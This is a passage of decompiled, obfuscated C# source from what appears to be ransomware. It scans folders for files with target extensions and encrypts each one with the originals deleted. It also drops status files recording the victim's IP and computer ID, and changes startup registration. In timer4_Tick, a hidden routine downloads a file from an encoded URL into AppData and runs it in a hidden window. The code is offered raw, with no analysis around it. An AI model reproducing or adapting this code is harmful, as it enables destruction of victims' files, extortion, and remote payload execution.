			switch ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 3 : 2)
			{
			case 0:
			case 2:
				PathsQueue.Clear();
				break;
			case 3:
				break;
			}
		}
		finally
		{
			if (lockTaken)
			{
				Monitor.Exit(pathsQueue);
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwPathFinder_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		Log.WriteLog(LogPath, string.Format(S7EI44sMaZQ92MiG6X.pA2PN5iOW(244), TotalFindPaths));
		FinishedPathFinder = true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwPathFinder_DoWork(object sender, DoWorkEventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_00a5, IL_01a0, IL_02e5, IL_0469
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 4 : 5);
		List<string>.Enumerator enumerator3 = default(List<string>.Enumerator);
		bool flag = default(bool);
		List<string> list = default(List<string>);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 6:
					try
					{
						while (enumerator3.MoveNext())
						{
							string current3 = enumerator3.Current;
							if (!IsStarted)
							{
								continue;
							}
							try
							{
								IEnumerable<string> folderFilesPaths2 = current3.GetFolderFilesPaths();
								foreach (string item in folderFilesPaths2)
								{
									try
									{
										string directoryName3 = Path.GetDirectoryName(item);
										_ = 0;
										int num6 = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 2 : 3);
										do
										{
											IL_00ae:
											switch (num6)
											{
											case 0:
											case 3:
												flag = !list.Contains(directoryName3);
												goto case 1;
											case 1:
											case 2:
												if (flag)
												{
													break;
												}
												goto end_IL_00ae;
											default:
												num6 = 4;
												goto IL_00ae;
											case 4:
												break;
											case 5:
												goto end_IL_00ae;
											}
											list.Add(directoryName3);
											num6 = 5;
											continue;
											end_IL_00ae:
											break;
										}
										while (true);
									}
									catch (Exception)
									{
									}
								}
							}
							catch (Exception ex5)
							{
								Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(248) + ex5.ToString());
							}
						}
					}
					finally
					{
						((IDisposable)enumerator3).Dispose();
					}
					IgnoredPaths.AddRange(list);
					num2 = 2;
					continue;
				case 3:
					enumerator3 = IgnoredPaths.GetEnumerator();
					goto case 6;
				default:
					num = 6;
					break;
				case 1:
					return;
				case 4:
					return;
				case 2:
					enumerator = StartPaths.GetEnumerator();
					num2 = 7;
					continue;
				case 0:
				case 5:
					if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(56))
					{
						return;
					}
					list = new List<string>();
					num = 3;
					if (0 == 0)
					{
						break;
					}
					goto case 2;
				case 7:
					try
					{
						while (enumerator.MoveNext())
						{
							string current = enumerator.Current;
							if (!IsStarted)
							{
								break;
							}
							try
							{
								if (File.Exists(current))
								{
									try
									{
										string directoryName = Path.GetDirectoryName(current);
										if (!IgnoredPaths.Contains(directoryName) && current.CheckExtension(SearchExtensions))
										{
											lock (PathsQueue)
											{
												_ = 0;
												int num3;
												if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
												{
													num3 = 2;
													if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
													{
														goto IL_02d2;
													}
												}
												else
												{
													num3 = 3;
												}
												switch (num3)
												{
												case 0:
												case 2:
													break;
												default:
													goto end_IL_02aa;
												case 3:
													goto end_IL_02aa;
												}
												goto IL_02d2;
												IL_02d2:
												PathsQueue.Enqueue(current);
												end_IL_02aa:;
											}
											TotalFindPaths++;
										}
									}
									catch (Exception ex)
									{
										Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(252) + ex.ToString());
									}
								}
								try
								{
									if (!Directory.Exists(current) || IgnoredPaths.Contains(current))
									{
										continue;
									}
									IEnumerable<string> folderFilesPaths = current.GetFolderFilesPaths();
									foreach (string item2 in folderFilesPaths)
									{
										try
										{
											string directoryName2 = Path.GetDirectoryName(item2);
											if (IgnoredPaths.Contains(directoryName2))
											{
												continue;
											}
											if (!IsStarted)
											{
												break;
											}
											if (item2.CheckExtension(SearchExtensions) && !item2.EndsWith(S7EI44sMaZQ92MiG6X.pA2PN5iOW(256)))
											{
												lock (PathsQueue)
												{
													_ = 1;
													int num4;
													if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
													{
														num4 = 2;
													}
													else
													{
														int num5 = 3;
														num4 = num5;
													}
													switch (num4)
													{
													case 0:
													case 2:
														PathsQueue.Enqueue(item2);
														break;
													case 3:
														break;
													}
												}
												TotalFindPaths++;
											}
											Thread.Sleep(1);
											continue;
										}
										catch
										{
										}
									}
								}
								catch (Exception ex2)
								{
									Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(260) + ex2.ToString());
								}
							}
							catch (Exception ex3)
							{
								Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(264) + ex3.ToString());
							}
						}
						return;
					}
					finally
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwEncryptor_DoWork(object sender, DoWorkEventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0025, IL_00ef, IL_01c5
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		if (1 == 0)
		{
			goto IL_0018;
		}
		goto IL_002e;
		IL_002e:
		bool isStarted = default(bool);
		bool flag = default(bool);
		string directoryName = default(string);
		while (true)
		{
			switch (num)
			{
			case 1:
			case 2:
				break;
			default:
				goto IL_0057;
			case 3:
			case 6:
				if (!isStarted)
				{
					goto IL_02f0;
				}
				try
				{
					if (PathsQueue.Count != 0)
					{
						string currentPassword = CurrentPassword;
						string path = string.Empty;
						lock (PathsQueue)
						{
							_ = 1;
							int num3;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								int num2 = 2;
								num3 = num2;
							}
							else
							{
								num3 = 3;
							}
							switch (num3)
							{
							case 0:
							case 2:
								path = PathsQueue.Dequeue();
								break;
							case 3:
								break;
							}
						}
						if (File.Exists(path))
						{
							try
							{
								path.EncryptFileAsync(currentPassword, deleteOriginal: true);
								int num4 = 2;
								while (true)
								{
									int num5;
									switch (num4)
									{
									default:
										if (flag)
										{
											num5 = 6;
											goto IL_01ce;
										}
										break;
									case 2:
										EncryptionCount++;
										_ = 1;
										num5 = (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 5 : 0);
										goto IL_01ce;
									case 0:
									case 1:
										directoryName = Path.GetDirectoryName(path);
										num5 = 4;
										goto IL_01ce;
									case 4:
										flag = !StatusFile.StatusFileExist(directoryName, S7EI44sMaZQ92MiG6X.pA2PN5iOW(268));
										goto default;
									case 6:
										StatusFile.WriteStatusFile(directoryName, CurrentIP, ComputerId.ToString(), DateTime.Now, S7EI44sMaZQ92MiG6X.pA2PN5iOW(268));
										num5 = 7;
										if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
										{
											goto IL_01ce;
										}
										break;
									case 7:
										break;
									}
									break;
									IL_01ce:
									num4 = num5;
								}
							}
							catch (Exception ex)
							{
								Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(272) + ex.ToString());
							}
						}
					}
					if (FinishedPathFinder && PathsQueue.Count == 0)
					{
						goto IL_02f0;
					}
				}
				catch (Exception ex2)
				{
					Log.WriteLog(ErrorLogPath, S7EI44sMaZQ92MiG6X.pA2PN5iOW(276) + ex2.ToString());
				}
				Thread.Sleep(20);
				num = 1;
				continue;
			case 4:
			case 5:
				goto IL_02f0;
			case 0:
				goto IL_0306;
			case 7:
				return;
			}
			break;
		}
		goto IL_0018;
		IL_002a:
		int num6;
		num = num6;
		goto IL_002e;
		IL_0057:
		_ = 1;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num6 = 6;
			goto IL_002a;
		}
		num = 5;
		if (1 == 0)
		{
			goto IL_0018;
		}
		goto IL_002e;
		IL_0306:
		if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(60))
		{
			num6 = 2;
			goto IL_002a;
		}
		return;
		IL_02f0:
		e.Result = true;
		num6 = 7;
		goto IL_002a;
		IL_0018:
		isStarted = IsStarted;
		goto IL_0057;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void BwEncryptor_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0038, IL_014f
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01d5: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 7;
			goto IL_0045;
		}
		int num2 = 5;
		goto IL_0041;
		IL_0041:
		num = num2;
		goto IL_0045;
		IL_0045:
		bool finishedPathFinder = default(bool);
		while (true)
		{
			int num3;
			switch (num)
			{
			case 4:
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
				goto case 8;
			default:
				num3 = 8;
				goto IL_003d;
			case 8:
				Reg.RegisterInStartup(isChecked: false, Application.get_ExecutablePath());
				num2 = 6;
				if (0 == 0)
				{
					break;
				}
				goto case 2;
			case 2:
			case 5:
				if (finishedPathFinder)
				{
					num = 9;
					continue;
				}
				return;
			case 0:
			case 7:
				if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(64))
				{
					num2 = 1;
					if (0 == 0)
					{
						break;
					}
					goto case 1;
				}
				return;
			case 1:
				finishedPathFinder = FinishedPathFinder;
				goto case 2;
			case 9:
				Log.WriteLog(LogPath, string.Format(S7EI44sMaZQ92MiG6X.pA2PN5iOW(280), EncryptionCount));
				num3 = 4;
				goto IL_003d;
			case 3:
				try
				{
					Process process = new Process();
					int num4 = 4;
					while (true)
					{
						int num5;
						switch (num4)
						{
						case 5:
							process.Start();
							num5 = 6;
							if (0 == 0)
							{
								goto IL_0158;
							}
							goto case 1;
						case 1:
						case 3:
							process.StartInfo.CreateNoWindow = true;
							goto default;
						default:
							process.StartInfo.FileName = S7EI44sMaZQ92MiG6X.pA2PN5iOW(288);
							num5 = 5;
							if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
							{
								goto IL_0158;
							}
							goto case 4;
						case 4:
							process.StartInfo.UseShellExecute = false;
							_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
							if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
							{
								num5 = 0;
								if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
								{
									goto IL_0158;
								}
								goto default;
							}
							num5 = 3;
							goto IL_0158;
						case 6:
							break;
						}
						break;
						IL_0158:
						num4 = num5;
					}
				}
				catch
				{
				}
				((Form)this).Close();
				num = 10;
				continue;
			case 6:
				Log.WriteLog(LogPath, string.Format(S7EI44sMaZQ92MiG6X.pA2PN5iOW(284)));
				num3 = 3;
				goto IL_003d;
			case 10:
				return;
				IL_003d:
				num2 = num3;
				break;
			}
			break;
		}
		goto IL_0041;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer1_Tick(object sender, EventArgs e)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer2_Tick(object sender, EventArgs e)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	private void button4_Click(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0071
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		_ = 1;
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 2;
			if (1 == 0)
			{
				goto IL_0022;
			}
			goto IL_007a;
		}
		int num2 = 3;
		goto IL_007e;
		IL_0063:
		string s = default(string);
		int result = default(int);
		bool flag = int.TryParse(s, out result);
		goto IL_003e;
		IL_003e:
		MessageBox.Show(S7EI44sMaZQ92MiG6X.pA2PN5iOW(296) + result);
		num2 = 5;
		goto IL_007e;
		IL_007e:
		switch (num2)
		{
		case 0:
		case 2:
			break;
		case 4:
			goto IL_003e;
		case 1:
		case 3:
			goto IL_0063;
		default:
			goto IL_009b;
		case 5:
			return;
		}
		goto IL_0022;
		IL_009b:
		num = 4;
		if (1 == 0)
		{
			return;
		}
		goto IL_007a;
		IL_007a:
		num2 = num;
		goto IL_007e;
		IL_0022:
		s = S7EI44sMaZQ92MiG6X.pA2PN5iOW(292);
		goto IL_0063;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer3_Tick(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0030
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00b2: Incompatible stack heights: 0 vs 1
		int num = 0;
		while (true)
		{
			switch (num)
			{
			case 1:
			case 3:
				((ListControl)comboBox1).set_ValueMember(S7EI44sMaZQ92MiG6X.pA2PN5iOW(304));
				goto default;
			default:
				((ListControl)comboBox1).set_DisplayMember(S7EI44sMaZQ92MiG6X.pA2PN5iOW(308));
				num = 5;
				break;
			case 0:
				comboBox1.set_DataSource((object)S7EI44sMaZQ92MiG6X.pA2PN5iOW(300));
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 4;
					break;
				}
				num = 3;
				if (1 == 0)
				{
					return;
				}
				break;
			case 5:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer4_Tick(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_003e
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 15;
		Process process = default(Process);
		string fileName = default(string);
		WebClient webClient = default(WebClient);
		string randomFileName = default(string);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				IL_0047:
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 14:
					{
						string text = process.StandardOutput.ReadToEnd();
						num2 = 7;
						if (0 == 0)
						{
							goto IL_0047;
						}
						goto case 0;
					}
					case 0:
						process.StartInfo.UseShellExecute = false;
						goto case 13;
					case 8:
					case 10:
						process.StartInfo.FileName = fileName;
						num3 = 11;
						continue;
					case 5:
						webClient.DownloadFile(S7EI44sMaZQ92MiG6X.pA2PN5iOW(320), fileName);
						num3 = 12;
						continue;
					case 6:
						webClient = new WebClient();
						num2 = 2;
						goto IL_0047;
					case 12:
						process = new Process();
						num2 = 0;
						if (0 == 0)
						{
							goto IL_0047;
						}
						goto case 2;
					case 2:
						randomFileName = Path.GetRandomFileName();
						_ = 0;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							num2 = 3;
							if (true)
							{
								goto IL_0047;
							}
							goto case 13;
						}
						num2 = 8;
						goto IL_0047;
					case 13:
						process.StartInfo.CreateNoWindow = true;
						num3 = 1;
						continue;
					case 11:
						process.Start();
						num2 = 14;
						goto IL_0047;
					case 1:
						process.StartInfo.RedirectStandardOutput = true;
						goto case 8;
					case 3:
					case 4:
						goto IL_016a;
					case 7:
						process.WaitForExit();
						num3 = 16;
						continue;
					case 9:
						goto IL_019c;
					case 15:
						if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(68))
						{
							num2 = 9;
							goto IL_0047;
						}
						return;
					case 16:
						return;
					}
					break;
				}
				num = 13;
				break;
				IL_016a:
				fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + randomFileName + S7EI44sMaZQ92MiG6X.pA2PN5iOW(316);
				num = 5;
				break;
				IL_019c:
				webBrowser1.Navigate(S7EI44sMaZQ92MiG6X.pA2PN5iOW(312));
				num = 6;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0097
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		_ = 0;
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 3;
			if (1 == 0)
			{
				goto IL_0022;
			}
			goto IL_00a0;
		}
		int num2 = 18;
		goto IL_009c;
		IL_003a:
		char[] array = default(char[]);
		array[3] = 'D';
		num = 4;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_0052;
		}
		goto IL_00a0;
		IL_006d:
		int num3 = 0;
		num2 = 1;
		goto IL_009c;
		IL_009c:
		num = num2;
		goto IL_00a0;
		IL_00a0:
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			IL_00a0_2:
			int num4 = num;
			while (true)
			{
				switch (num4)
				{
				case 13:
					break;
				case 9:
					goto IL_003a;
				case 16:
					goto IL_0052;
				case 19:
					goto IL_006d;
				case 2:
					num5++;
					num = 14;
					if (true)
					{
						goto IL_00a0_2;
					}
					goto case 15;
				case 15:
					num3++;
					goto case 1;
				default:
					num = 5;
					goto IL_00a0_2;
				case 10:
				case 14:
					flag2 = num5 < array.Length;
					num4 = 7;
					continue;
				case 4:
					array[4] = 'E';
					num4 = 19;
					continue;
				case 12:
				case 18:
					Array.Resize(ref array, 3);
					num = 6;
					if (0 == 0)
					{
						goto IL_00a0_2;
					}
					goto case 7;
				case 7:
					if (!flag2)
					{
						num4 = 20;
						continue;
					}
					MessageBox.Show(array[num5].ToString());
					num = 2;
					if (true)
					{
						goto IL_00a0_2;
					}
					goto case 11;
				case 8:
					array[2] = 'C';
					num = 9;
					goto IL_00a0_2;
				case 0:
				case 3:
					if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(72))
					{
						num = 16;
						goto IL_00a0_2;
					}
					return;
				case 6:
					num5 = 0;
					num = 10;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						goto IL_00a0_2;
					}
					goto case 1;
				case 11:
					array[0] = 'A';
					num4 = 13;
					continue;
				case 1:
				case 5:
					flag = num3 < array.Length;
					num2 = 17;
					goto IL_009c;
				case 17:
					if (flag)
					{
						MessageBox.Show(array[num3].ToString());
						num = 15;
						goto IL_00a0_2;
					}
					goto case 12;
				case 20:
					return;
				}
				break;
			}
			break;
		}
		goto IL_0022;
		IL_0022:
		array[1] = 'B';
		num = 8;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_003a;
		}
		goto IL_00a0;
		IL_0052:
		array = new char[5];
		num = 11;
		if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			goto IL_006d;
		}
		goto IL_00a0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void button6_Click(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_0005, IL_0090, IL_020f
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0204: Unknown result type (might be due to invalid IL or missing references)
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0364: Unknown result type (might be due to invalid IL or missing references)
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		int num;
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 2;
			goto IL_021c;
		}
		int num2 = 17;
		goto IL_0218;
		IL_0218:
		num = num2;
		goto IL_021c;
		IL_021c:
		List<string> list2 = default(List<string>);
		string text = default(string);
		bool flag2 = default(bool);
		List<string> list = default(List<string>);
		int num7 = default(int);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string[] array = default(string[]);
		int num3 = default(int);
		int count = default(int);
		string[] array2 = default(string[]);
		bool flag = default(bool);
		while (true)
		{
			int num4;
			switch (num)
			{
			case 27:
				list2.Clear();
				num2 = 6;
				if (0 == 0)
				{
					break;
				}
				goto case 25;
			case 25:
				MessageBox.Show(text);
				num = 31;
				continue;
			case 18:
				if (!flag2)
				{
					num4 = 14;
					goto IL_0214;
				}
				MessageBox.Show(list[num7]);
				num = 30;
				continue;
			case 10:
				try
				{
					while (enumerator.MoveNext())
					{
						string current = enumerator.Current;
						_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
						int num6;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							int num5 = 2;
							num6 = num5;
						}
						else
						{
							num6 = 3;
						}
						switch (num6)
						{
						case 0:
						case 2:
							MessageBox.Show(current);
							break;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator).Dispose();
				}
				list.Remove(S7EI44sMaZQ92MiG6X.pA2PN5iOW(336));
				num2 = 4;
				if (0 == 0)
				{
					break;
				}
				goto case 7;
			case 7:
			case 24:
				array = new string[3];
				num2 = 22;
				break;
			case 32:
				return;
			case 9:
				array[2] = S7EI44sMaZQ92MiG6X.pA2PN5iOW(332);
				goto case 17;
			case 30:
				num7++;
				num2 = 13;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					break;
				}
				goto case 4;
			case 4:
				num7 = 0;
				num2 = 8;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					break;
				}
				goto case 8;
			case 26:
				num3 = 0;
				num2 = 28;
				break;
			case 23:
				MessageBox.Show(count.ToString());
				num2 = 33;
				if (true)
				{
					break;
				}
				goto case 16;
			case 16:
				list.Add(S7EI44sMaZQ92MiG6X.pA2PN5iOW(332));
				num2 = 15;
				if (true)
				{
					break;
				}
				goto case 19;
			case 19:
			case 28:
				if (num3 >= array2.Length)
				{
					num2 = 27;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
				}
				else
				{
					text = array2[num3];
					num2 = 25;
					if (0 == 0)
					{
						break;
					}
				}
				goto case 17;
			case 3:
				MessageBox.Show(S7EI44sMaZQ92MiG6X.pA2PN5iOW(340));
				goto case 7;
			default:
				num4 = 7;
				goto IL_0214;
			case 1:
				list.Add(S7EI44sMaZQ92MiG6X.pA2PN5iOW(328));
				num = 16;
				continue;
			case 15:
				list.Insert(1, S7EI44sMaZQ92MiG6X.pA2PN5iOW(336));
				num = 11;
				continue;
			case 8:
			case 13:
				flag2 = num7 < list.Count;
				num4 = 18;
				goto IL_0214;
			case 0:
			case 2:
				if (!S7EI44sMaZQ92MiG6X.EmWT1u1C4(76))
				{
					list = new List<string>();
					num2 = 20;
					break;
				}
				num2 = 32;
				if (true)
				{
					break;
				}
				goto case 7;
			case 6:
				count = list2.Count;
				num4 = 23;
				goto IL_0214;
			case 5:
				array[1] = S7EI44sMaZQ92MiG6X.pA2PN5iOW(328);
				num4 = 9;
				goto IL_0214;
			case 11:
				enumerator = list.GetEnumerator();
				num2 = 10;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					break;
				}
				goto case 19;
			case 29:
				if (!flag)
				{
					MessageBox.Show(S7EI44sMaZQ92MiG6X.pA2PN5iOW(344));
					num2 = 24;
				}
				else
				{
					num2 = 3;
				}
				break;
			case 12:
				array2 = array;
				num2 = 26;
				if (true)
				{
					break;
				}
				goto case 14;
			case 14:
				flag = list.Contains(S7EI44sMaZQ92MiG6X.pA2PN5iOW(328));
				num4 = 29;
				goto IL_0214;
			case 17:
			case 21:
				list2 = new List<string>(array);
				num4 = 12;
				goto IL_0214;
			case 20:
				list.Add(S7EI44sMaZQ92MiG6X.pA2PN5iOW(324));
				num4 = 1;
				goto IL_0214;
			case 22:
				array[0] = S7EI44sMaZQ92MiG6X.pA2PN5iOW(324);
				num = 5;
				continue;
			case 31:
				num3++;
				num2 = 19;
				break;
			case 33:
				return;
				IL_0214:
				num2 = num4;
				break;
			}
			break;
		}
		goto IL_0218;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void Dispose(bool disposing)
	{
		//Discarded unreachable code: IL_0005, IL_0032
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num;
